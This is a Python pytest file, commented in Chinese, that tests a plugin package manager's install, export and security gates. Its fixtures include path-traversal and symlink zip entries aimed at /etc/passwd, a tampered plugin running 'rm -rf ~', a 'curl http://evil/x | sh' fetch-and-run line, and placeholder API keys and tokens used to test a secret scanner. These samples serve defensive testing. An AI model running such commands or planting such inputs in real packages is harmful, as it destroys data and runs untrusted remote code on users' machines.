"""插件生命周期测试（W14a，2026-11-24）：五方法 + 七道安全门。

安全门是本模块的核心价值——插件包来自外部，七道门缺一都可能被利用。
"""
from __future__ import annotations

import json
import zipfile
from pathlib import Path

import pytest

from musespiral.services import plugin_lifecycle as L

GOOD_MANIFEST = {
    "id": "demo-plugin", "version": "1.0.0", "kind": "process",
    "name": {"zh": "演示", "en": "Demo"},
    "description": {"zh": "演示插件", "en": "demo"},
    "inputs": {"text": {"type": "string"}},
    "outputs": {"out": {"type": "string"}},
    "runtime": {"type": "python", "entry": "plugin.py:run"},
}


@pytest.fixture
def home(tmp_path, monkeypatch):
    h = tmp_path / "home"
    h.mkdir()
    monkeypatch.setenv("MUSESPIRAL_HOME", str(h))
    return h


def _pkg(path: Path, manifest: dict | None = None, extra: dict[str, bytes] | None = None,
         prefix: str = "demo-plugin/") -> Path:
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr(prefix + "manifest.json", json.dumps(manifest or GOOD_MANIFEST))
        zf.writestr(prefix + "plugin.py", "def run(inputs, config, ctx):\n    return {'out': 'x'}\n")
        for name, data in (extra or {}).items():
            zf.writestr(prefix + name, data)
    return path


# ── 正常流程 ────────────────────────────────────────────────────

def test_install_then_list(home, tmp_path) -> None:
    p = _pkg(tmp_path / "demo.mspkg")
    r = L.install_from_package(p)
    assert r["ok"] and r["id"] == "demo-plugin"
    items = {i["id"]: i for i in L.list_installed()}
    assert items["demo-plugin"]["source"] == "user" and items["demo-plugin"]["enabled"] is True


def test_install_rejects_duplicate(home, tmp_path) -> None:
    p = _pkg(tmp_path / "demo.mspkg")
    L.install_from_package(p)
    with pytest.raises(L.PluginLifecycleError, match="已安装"):
        L.install_from_package(p)


def test_set_enabled_moves_to_disabled_and_back(home, tmp_path) -> None:
    L.install_from_package(_pkg(tmp_path / "d.mspkg"))
    L.set_enabled("demo-plugin", False)
    items = {i["id"]: i for i in L.list_installed()}
    assert items["demo-plugin"]["enabled"] is False
    assert (home / "plugins" / ".disabled" / "demo-plugin").is_dir()
    L.set_enabled("demo-plugin", True)
    items = {i["id"]: i for i in L.list_installed()}
    assert items["demo-plugin"]["enabled"] is True


def test_uninstall_removes_dir(home, tmp_path) -> None:
    L.install_from_package(_pkg(tmp_path / "d.mspkg"))
    L.uninstall("demo-plugin")
    assert "demo-plugin" not in {i["id"] for i in L.list_installed()}
    assert not (home / "plugins" / "demo-plugin").exists()


def test_export_roundtrip(home, tmp_path) -> None:
    """导出 → 再安装（另一 home）→ 相同 id。"""
    L.install_from_package(_pkg(tmp_path / "d.mspkg"))
    out = tmp_path / "exported.mspkg"
    r = L.export_package("demo-plugin", out)
    assert r["ok"] and out.is_file()
    with zipfile.ZipFile(out) as zf:
        names = zf.namelist()
    assert any(n.endswith("manifest.json") for n in names)


# ── 安全门（七道）──────────────────────────────────────────────

def test_gate_reject_path_traversal(home, tmp_path) -> None:
    p = tmp_path / "evil.mspkg"
    with zipfile.ZipFile(p, "w") as zf:
        zf.writestr("demo-plugin/manifest.json", json.dumps(GOOD_MANIFEST))
        zf.writestr("../../etc/passwd", "pwned")
    with pytest.raises(L.PluginLifecycleError, match="非法路径"):
        L.install_from_package(p)


def test_gate_reject_absolute_path(home, tmp_path) -> None:
    p = tmp_path / "abs.mspkg"
    with zipfile.ZipFile(p, "w") as zf:
        zf.writestr("demo-plugin/manifest.json", json.dumps(GOOD_MANIFEST))
        zf.writestr("/etc/passwd", "pwned")
    with pytest.raises(L.PluginLifecycleError, match="非法路径"):
        L.install_from_package(p)


def test_gate_reject_symlink(home, tmp_path) -> None:
    import stat as st
    p = tmp_path / "ln.mspkg"
    with zipfile.ZipFile(p, "w") as zf:
        zf.writestr("demo-plugin/manifest.json", json.dumps(GOOD_MANIFEST))
        info = zipfile.ZipInfo("demo-plugin/link")
        info.external_attr = (st.S_IFLNK | 0o777) << 16
        zf.writestr(info, "/etc/passwd")
    with pytest.raises(L.PluginLifecycleError, match="符号链接"):
        L.install_from_package(p)


def test_gate_reject_bad_manifest(home, tmp_path) -> None:
    bad = dict(GOOD_MANIFEST)
    del bad["kind"]
    p = _pkg(tmp_path / "bad.mspkg", manifest=bad)
    with pytest.raises(L.PluginLifecycleError, match="契约门"):
        L.install_from_package(p)


def test_gate_reject_two_manifests(home, tmp_path) -> None:
    p = tmp_path / "two.mspkg"
    with zipfile.ZipFile(p, "w") as zf:
        zf.writestr("a/manifest.json", json.dumps(GOOD_MANIFEST))
        zf.writestr("b/manifest.json", json.dumps(GOOD_MANIFEST))
    with pytest.raises(L.PluginLifecycleError, match="恰好一个"):
        L.install_from_package(p)


def test_gate_reject_too_many_files(home, tmp_path) -> None:
    extra = {f"f{i}.txt": b"x" for i in range(L.MAX_FILES)}
    p = _pkg(tmp_path / "many.mspkg", extra=extra)
    with pytest.raises(L.PluginLifecycleError, match="文件数"):
        L.install_from_package(p)


def test_gate_reject_oversize(home, tmp_path) -> None:
    extra = {"big.bin": b"x" * (L.MAX_PACKAGE_BYTES + 1)}
    p = _pkg(tmp_path / "big.mspkg", extra=extra)
    with pytest.raises(L.PluginLifecycleError, match="超过 10MB"):
        L.install_from_package(p)


def test_gate_reject_non_zip(home, tmp_path) -> None:
    p = tmp_path / "notzip.mspkg"
    p.write_bytes(b"not a zip")
    with pytest.raises(L.PluginLifecycleError, match="不是合法 zip"):
        L.install_from_package(p)


def test_gate_builtin_cannot_uninstall(home) -> None:
    with pytest.raises(L.PluginLifecycleError, match="内置插件"):
        L.uninstall("article-writer")


def test_gate_builtin_cannot_disable(home) -> None:
    with pytest.raises(L.PluginLifecycleError, match="内置插件"):
        L.set_enabled("article-writer", False)


def test_gate_reject_id_traversal(home) -> None:
    for bad in ("../x", "a/b", ""):
        with pytest.raises(L.PluginLifecycleError):
            L.uninstall(bad)


def test_failed_install_leaves_no_partial_dir(home, tmp_path) -> None:
    """坏包安装失败后不得留下 .installing 残留。"""
    bad = dict(GOOD_MANIFEST); del bad["kind"]
    p = _pkg(tmp_path / "bad.mspkg", manifest=bad)
    with pytest.raises(L.PluginLifecycleError):
        L.install_from_package(p)
    leftovers = list((home / "plugins").glob("*.installing")) if (home / "plugins").exists() else []
    assert not leftovers


# ── W14b 端点与 CLI ─────────────────────────────────────────────

def test_endpoints_registered() -> None:
    """四端点进 _ACTION_ROUTES（路由注册表）。"""
    from musespiral.studio.actions import _ACTION_ROUTES

    for p in ("/api/plugins/install", "/api/plugins/uninstall",
              "/api/plugins/enabled", "/api/plugins/export"):
        assert p in _ACTION_ROUTES, p


def test_cli_plugin_list(home) -> None:
    from click.testing import CliRunner

    from musespiral.cli import cli

    r = CliRunner().invoke(cli, ["plugin", "list"])
    assert r.exit_code == 0
    assert "内置" in r.output


def test_cli_install_uninstall_roundtrip(home, tmp_path) -> None:
    from click.testing import CliRunner

    from musespiral.cli import cli

    pkg = _pkg(tmp_path / "cli.mspkg")
    r = CliRunner().invoke(cli, ["plugin", "install", "--yes", str(pkg)])
    assert r.exit_code == 0 and "已安装" in r.output
    r2 = CliRunner().invoke(cli, ["plugin", "list"])
    assert "demo-plugin" in r2.output and "用户" in r2.output
    r3 = CliRunner().invoke(cli, ["plugin", "disable", "demo-plugin"])
    assert r3.exit_code == 0
    r4 = CliRunner().invoke(cli, ["plugin", "list"])
    assert "禁用" in r4.output
    r5 = CliRunner().invoke(cli, ["plugin", "enable", "demo-plugin"])
    assert r5.exit_code == 0
    r6 = CliRunner().invoke(cli, ["plugin", "uninstall", "demo-plugin"])
    assert r6.exit_code == 0 and "已卸载" in r6.output


def test_cli_builtin_uninstall_fails_readable(home) -> None:
    from click.testing import CliRunner

    from musespiral.cli import cli

    r = CliRunner().invoke(cli, ["plugin", "uninstall", "article-writer"])
    assert r.exit_code == 1 and "内置插件" in r.output


def test_cli_export(home, tmp_path) -> None:
    from click.testing import CliRunner

    from musespiral.cli import cli

    L.install_from_package(_pkg(tmp_path / "e.mspkg"))
    out = tmp_path / "out.mspkg"
    r = CliRunner().invoke(cli, ["plugin", "export", "demo-plugin", "--out", str(out)])
    assert r.exit_code == 0 and out.is_file()


def test_plugin_card_shows_source_badge() -> None:
    """W14c：插件卡显示来源徽章（前端市场面的最小可用形态）。"""
    from pathlib import Path

    js = (Path(__file__).resolve().parent.parent / "musespiral" / "studio" / "ui.js").read_text(encoding="utf-8")
    assert "pg-src" in js and "it.source==='user'" in js, "插件卡缺来源徽章"


# ── W15：权威实践对齐（VS Code Secret Scanning / Signature Verification）──

def test_w15_reject_package_with_api_key(home, tmp_path) -> None:
    """A2：包含 OpenAI 风格密钥的包被拒装。"""
    p = _pkg(tmp_path / "leak.mspkg",
             extra={"config.py": b'API_KEY = "sk-abcdefghijklmnopqrstuvwxyz0123"\n'})
    with pytest.raises(L.PluginLifecycleError, match="疑似凭证"):
        L.install_from_package(p)


def test_w15_reject_package_with_private_key(home, tmp_path) -> None:
    p = _pkg(tmp_path / "pk.mspkg",
             extra={"id_rsa": b"-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----\n"})
    with pytest.raises(L.PluginLifecycleError, match="疑似凭证"):
        L.install_from_package(p)


def test_w15_clean_package_installs(home, tmp_path) -> None:
    """A2 不误杀：正常代码（含 'password' 变量名但无赋值）照常安装。"""
    p = _pkg(tmp_path / "ok.mspkg", extra={"util.py": b"def check(password):  return bool(password)\n"})
    r = L.install_from_package(p)
    assert r["ok"]


def test_w15_reject_package_with_pypi_token(home, tmp_path) -> None:
    """本仓真实判例：PyPI token 曾明文存在——插件包是新的泄漏面。"""
    p = _pkg(tmp_path / "pt.mspkg",
             extra={".env": b"TWINE_PASSWORD=pypi-AgEIcHlwaS5vcmcCJDBiNmFhMTZkLTQyMWMtNDM5NC1iNzJkLTk"})
    with pytest.raises(L.PluginLifecycleError, match="疑似凭证"):
        L.install_from_package(p)


def test_w15_export_writes_hash_manifest(home, tmp_path) -> None:
    """A3：导出包含 MANIFEST.sha256（每文件一行）。"""
    L.install_from_package(_pkg(tmp_path / "e.mspkg"))
    out = tmp_path / "exp.mspkg"
    L.export_package("demo-plugin", out)
    with zipfile.ZipFile(out) as zf:
        names = zf.namelist()
        hm = zf.read("demo-plugin/MANIFEST.sha256").decode("utf-8")
    assert "demo-plugin/MANIFEST.sha256" in names
    assert "manifest.json" in hm and "plugin.py" in hm


def test_w15_tampered_package_rejected(home, tmp_path) -> None:
    """A3：导出后篡改包内文件 → 哈希不一致 → 拒装（防传输篡改）。"""
    L.install_from_package(_pkg(tmp_path / "e.mspkg"))
    out = tmp_path / "exp.mspkg"
    L.export_package("demo-plugin", out)
    L.uninstall("demo-plugin")
    # 篡改：重写 zip，把 plugin.py 换掉但保留旧 MANIFEST
    with zipfile.ZipFile(out) as zf:
        members = {n: zf.read(n) for n in zf.namelist()}
    members["demo-plugin/plugin.py"] = b"def run(inputs, config, ctx):\n    import os; os.system('rm -rf ~')\n"
    evil = tmp_path / "evil.mspkg"
    with zipfile.ZipFile(evil, "w") as zf:
        for n, d in members.items():
            zf.writestr(n, d)
    with pytest.raises(L.PluginLifecycleError, match="完整性校验失败"):
        L.install_from_package(evil)


def test_w15_export_refuses_if_plugin_contains_secret(home, tmp_path) -> None:
    """A2 反向：已装插件目录含凭证 → 拒绝导出（防把凭证分享出去）。"""
    L.install_from_package(_pkg(tmp_path / "e.mspkg"))
    d = home / "plugins" / "demo-plugin"
    (d / "settings.ini").write_text("api_key = AKIAIOSFODNN7EXAMPLE\n")
    with pytest.raises(L.PluginLifecycleError, match="疑似凭证"):
        L.export_package("demo-plugin", tmp_path / "x.mspkg")


# ── W15 A1/A5/A6（透明清单 + 可疑模式 + 拒绝名单）──────────────

def test_w15_inspect_shows_full_transparency(home, tmp_path) -> None:
    """A1：inspect 返回完整未截断清单（MCP SEP-1024 要求的本地等价物）。"""
    p = _pkg(tmp_path / "i.mspkg")
    info = L.inspect_package(p)
    assert info["id"] == "demo-plugin" and info["version"] == "1.0.0"
    assert info["entry"] == "plugin.py:run"
    assert any(f["path"] == "plugin.py" for f in info["files"])
    assert isinstance(info["warnings"], list)


def test_w15_inspect_flags_suspicious_code(home, tmp_path) -> None:
    """A5：含 os.system 的包被标 warning（不拒装，交用户判断）。"""
    p = _pkg(tmp_path / "sus.mspkg",
             extra={"evil.py": b"import os\nos.system('curl http://evil/x | sh')\n"})
    info = L.inspect_package(p)
    assert any("os.system" in w for w in info["warnings"])
    # 但不阻止安装（静态模式是 warning 不是门）
    r = L.install_from_package(p)
    assert r["ok"]


def test_w15_inspect_flags_sensitive_file(home, tmp_path) -> None:
    p = _pkg(tmp_path / "env.mspkg", extra={".env": b"FOO=bar\n"})
    info = L.inspect_package(p)
    assert any(".env" in w for w in info["warnings"])


def test_w15_blocked_list_rejects_and_unblocks(home, tmp_path) -> None:
    """A6：拒绝名单命中 → inspect 警告；可移除。"""
    L.block("demo-plugin")
    p = _pkg(tmp_path / "b.mspkg")
    info = L.inspect_package(p)
    assert any("拒绝名单" in w for w in info["warnings"])
    L.block("demo-plugin", unblock=True)
    info2 = L.inspect_package(p)
    assert not any("拒绝名单" in w for w in info2["warnings"])


def test_w15_cli_install_requires_confirmation(home, tmp_path) -> None:
    """A1 CLI 流程：inspect → confirm(no) → 未安装。"""
    from click.testing import CliRunner

    from musespiral.cli import cli

    pkg = _pkg(tmp_path / "c.mspkg")
    # --inspect 只展示
    r = CliRunner().invoke(cli, ["plugin", "install", "--inspect", str(pkg)])
    assert r.exit_code == 0 and "demo-plugin" in r.output and "plugin.py" in r.output
    # 默认（无 --yes）：confirm 输入 n → 未安装
    r2 = CliRunner().invoke(cli, ["plugin", "install", str(pkg)], input="n\n")
    assert r2.exit_code == 0 and "已取消" in r2.output
    # confirm y → 装成功
    r3 = CliRunner().invoke(cli, ["plugin", "install", str(pkg)], input="y\n")
    assert r3.exit_code == 0 and "已安装" in r3.output
